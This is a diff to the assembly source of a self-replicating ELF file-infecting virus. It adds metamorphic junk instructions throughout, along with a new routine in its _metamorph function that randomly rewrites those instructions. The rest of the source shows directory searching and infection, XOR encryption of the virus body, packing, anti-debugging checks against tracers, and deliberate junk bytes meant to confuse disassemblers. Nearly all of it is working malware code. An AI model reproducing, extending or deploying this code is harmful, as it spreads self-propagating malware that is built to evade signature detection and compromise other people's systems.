@@ -42,6 +42,8 @@ _h3ll0w0rld:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus (for infected file cpy)
+	or r8, 0x0 ; metamorph
+
 %ifdef FSOCIETY ; get envv for execve
 	pop rax; argument counter
 	pop rdi; start of arguments
@@ -55,6 +57,7 @@ _h3ll0w0rld:
 	jmp .debug; avoid strace checking
 %endif
 	jmp .there
+	and rax, -1 ; metamorph
 	.here:
 		db `\x41\xb9`; TRASH ; mov rax,
 
@@ -76,6 +79,7 @@ _h3ll0w0rld:
 		syscall
 		push rax
 		pop rdi
+		and rdi, -1 ; metamorph
 
 		jmp $+4
 		syscall; TRASH ;
@@ -89,6 +93,7 @@ _h3ll0w0rld:
 		jmp $+4
 		db `\x48\x8d`; TRASH ; lea rax, rcx
 
+		add rax, 0x0
 		mov rax, 0; SYSCALL READ
 		nop
 		syscall
@@ -101,6 +106,7 @@ _h3ll0w0rld:
 		pop rdi
 		push rax
 		pop rsi
+		or r15, 0x0 ; metamorph
 
 		lea rdx, [rel tracer_pid]
 
@@ -118,11 +124,13 @@ _h3ll0w0rld:
 		jmp $+5
 		db `\x58\x48\xbf`; TRASH
 
+		and rdi, -1 ; metamorph
 		pop rdi
 		push rax
 		mov rax, SYSCALL_CLOSE
 		syscall
 		pop rax
+		and r15, -1 ; metamorph
 
 		add rsp, 4096
 		pop rcx
@@ -130,6 +138,7 @@ _h3ll0w0rld:
 		jmp .after
 	.there:
 		jmp .here + 2
+		and r8, -1 ; metamorph
 		push 8
 		nop
 		pop rax
@@ -148,9 +157,11 @@ _h3ll0w0rld:
 		push rdx
 		lea rdi, [rel _start]
 		mov rsi, [rel entry_inject]
+		add rax, 0x0 ; metamorph
 		sub rdi, rsi
 		sub rsi, 8 * 3
 		add rsi, [rel length]
+		add rsi, 0x0 ; metamorph
 		push 0x7
 		nop
 		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
@@ -159,17 +170,21 @@ _h3ll0w0rld:
 		syscall; change protect from file to _eof
 
 		lea rdi, [rel fingerprint]
+		and rax, -1 ; metamorph
 		call _ft_strlen
+		and rdx, -1 ; metamorph
 		push rax
 		pop rcx
 		push rdi
 
 		lea rdi, [rel _virus]
 		mov rdx, rdi
+		or rdx, 0x0 ; metamorph
 		lea rsi, [rel _params]
 		sub rdx, rsi
 		mov rsi, [rel length]
 		sub rsi, rdx ; length - (_virus - _params)
+		add rsi, 0x0 ; metamorph
 		pop rdx
 
 		call _xor_encrypt
@@ -177,6 +192,7 @@ _h3ll0w0rld:
 		lea rdx, [rel _h3ll0w0rld]
 		mov rcx, KEY_SIZE
 		call _xor_encrypt
+		add rdx, 0x0 ; metamorph
 		pop rdx
 
 	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
@@ -185,6 +201,7 @@ _h3ll0w0rld:
 	nop
 	pop rdi
 	nop
+	add r15, 0x0 ; metamorph
 	lea rsi, [rel debugging]
 	jmp $+6
 	db `\x48\xb8\x13\x37`
@@ -192,11 +209,13 @@ _h3ll0w0rld:
 	nop
 	pop rdx
 	nop
+	or r13, 0x0 ; metamorph
 	xor rax, rax
 	nop
 	nop
 	nop
 	add rax, 1
+	add rax, 0x0 ; metamorph
 	syscall
 
 	jmp $+4; has to skip 2 byte of instruction next line
@@ -208,6 +227,7 @@ _h3ll0w0rld:
 	mov rax, 0x0
 	nop
 	add rax, 60
+	and rax, -1 ; metamorph
 	jmp $+5
 	.ft_juggling:
 	db `\x48\xb8`; TRASH ; mov rax,
@@ -215,8 +235,10 @@ _h3ll0w0rld:
 	syscall
 	jmp .infected
 	.sneakyboi:
+	add r8, 0x0 ; metamorph
 	mov rax, 0
 	nop
+	and r8, -1 ; metamorph
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jnz .code ; .xor_decrypt
 	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
@@ -232,7 +254,9 @@ _h3ll0w0rld:
 
 	; host part
 	call _make_virus_map
+	add r8, 0x0 ; metamorph
 	call _search_dir
+	and r8, -1 ; metamorph
 	call _munmap_virus
 
 	jmp _exit
@@ -240,6 +264,8 @@ _h3ll0w0rld:
 %ifndef DEBUG
 		mov rax, SYSCALL_FORK; fork
 		syscall
+
+		add rax, 0x0 ; metamorph
 
 		cmp rax, 0x0
 		jz _virus
@@ -283,10 +309,12 @@ ret
 _exit:
 	push SYSCALL_EXIT
 	pop rax ; exit
+	add rax, 0x0 ; metamorph
 	xor rdi, rdi
 	nop
 	nop
 	nop
+	and rdi, -1 ; metamorph
 	syscall
 
 _ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
@@ -393,6 +421,7 @@ _virus:
 	nop
 	nop
 	nop
+	add rdi, 0x0; metamorph
 
 	lea rsi, [rel _eof]
 	lea r8, [rel _params]
@@ -401,16 +430,19 @@ _virus:
 	nop
 	pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
 	nop
+	and rdx, -1; metamorph
 	push 34
 	nop
 	pop r10; MAP_PRIVATE | MAP_ANON
 	nop
+	or r15, 0x0; metamorph
 	push -1
 	pop r8 ; fd
 	xor r9, r9; offset
 	nop
 	nop
 	nop
+	add r9, 0x0; metamorph
 	mov rax, SYSCALL_MMAP; mmap
 	syscall
 
@@ -422,18 +454,23 @@ _virus:
 	lea rsi, [rel _params]
 	lea rdx, [rel _pack_start]
 	sub rdx, rsi
+	or rdx, 0x0; metamorph
 	call _ft_memcpy
 
 	mov r9, rdi; save addr
+	and r9, -1; metamorph
 ;		unpack(void *dst, void *src, size_t len)
 	add rdi, rdx
 	add rsi, rdx
 	mov rax, [rel length]
 	sub rax, rdx; length - [_pack_start - params]
 	push rax
+	add rax, 0x0; metamorph
 	pop rdx
 
 	call _unpack
+
+	add r9, 0x0; metamorph
 
 	push r9
 	pop rdi
@@ -442,6 +479,8 @@ _virus:
 	pop r9
 	pop r8
 
+	or rdi, 0x0; metamorph
+
 	push rsi ; save length
 
 	lea rsi, [rel _params]
@@ -449,12 +488,16 @@ _virus:
 	sub rax, rsi
 	add rax, rdi
 
+	and r10, -1; metamorph
+
 	push rdi ; save addr
 	push r14
 	mov r14, [rel length]
 
 	call rax ; jump to mmaped memory
 	pop r14
+
+	and r14, -1; metamorph
 
 	pop rdi ; pop addr
 	pop rsi ; pop length
@@ -475,8 +518,11 @@ _prg:
 	push r8
 	pop rax
 
+	or rax, 0x0; metamorph
+
 	sub rax, [rel entry_inject]
 	add rax, [rel entry_prg]
+	add rax, 0x0; metamorph
 
 	; jmp on entry_prg
 	jmp rax
@@ -500,14 +546,17 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 	nop
 	nop
 	nop
+	add rax, 0x0; metamorph
 	xor rcx, rcx
 	nop
 	nop
 	nop
+	and rcx, -1; metamorph
 	xor r8, r8
 	nop
 	nop
 	nop
+	add r8, 0x0; metamorph
 	.loop_uncompress:
 		cmp rcx, r11
 		jge .end_loop
@@ -523,6 +572,7 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 			add rdi, r8
 			mov al, [r10 + rcx + 1]
 			push rdi
+			add rdi, 0x0; metamorph
 			pop rsi
 			sub rsi, rax
 			mov al, [r10 + rcx + 2]
@@ -531,17 +581,21 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 			call _ft_memcpy
 			mov rax, 0
 			nop
+			add rax, 0x0; metamorph
 			mov al, byte[r10 + rcx + 2]
 			add r8, rax
 			add rcx, 3
+			and rcx, -1; metamorph
 		jmp .loop_uncompress
 	.end_loop:
 		push r9
 		pop rdi
 		push r10
 		pop rsi
+		and rsi, -1; metamorph
 		push r11
 		pop rdx
+		add rdx, 0x0; metamorph
 
 	pop rcx
 	pop r11
@@ -1416,6 +1470,10 @@ _metamorph:; (rdi -> ptr)
 		jz .swap_instruction_pattern_f
 		cmp word[rdi], `\xeb\x02`
 		je .swap_instruction_pattern_g
+		cmp word[rdi], `\x48\x83`
+		je .swap_instruction_pattern_h
+		cmp word[rdi], `\x49\x83`
+		je .swap_instruction_pattern_h
 		jmp .inc_rcx
 		.swap_instruction_pattern_a:; xor rax, rax; nop; nop; nop-> mov rax, 0; nop
 			cmp byte[rdi + 3], 0x90
@@ -1581,6 +1639,53 @@ _metamorph:; (rdi -> ptr)
 			call _rand
 			mov byte[rdi + 3], al
 			add rcx, 4
+			jmp .inc_rcx
+		.swap_instruction_pattern_h:; or r8, 0x0 // and r8, -1
+			cmp byte[rdi + 3], 0xff
+			je .ff
+			cmp byte[rdi + 3], 0x00
+			jne .inc_rcx
+				cmp byte[rdi + 2], 0xc0
+				jl .inc_rcx
+				cmp byte[rdi + 2], 0xcf
+				jg .inc_rcx
+			jmp .continue_h
+			.ff:
+				cmp byte[rdi + 2], 0xe0
+				jl .inc_rcx
+				cmp byte[rdi + 2], 0xe7
+				jg .inc_rcx
+			.continue_h:
+				push rdi
+				mov rdi, 2
+				call _rand_modulo
+				pop rdi
+				mov byte[rdi], 0x48
+				add byte[rdi], al
+			push rdi
+			mov rdi, 2
+			call _rand_modulo
+			pop rdi
+			cmp rax, 0x0
+			je .ff_res
+				mov byte[rdi + 3], 0x00
+				mov byte[rdi + 2], 0xc0
+				push rdi
+				mov rdi, 16
+				call _rand_modulo
+				pop rdi
+				add byte[rdi + 2], al
+			jmp .end_h
+			.ff_res:
+				mov byte[rdi + 3], 0xff
+				mov byte[rdi + 2], 0xe0
+				push rdi
+				mov rdi, 8
+				call _rand_modulo
+				pop rdi
+				add byte[rdi + 2], al
+			.end_h:
+			add rcx, 3
 			jmp .inc_rcx
 		.inc_rcx:
 			pop rsi
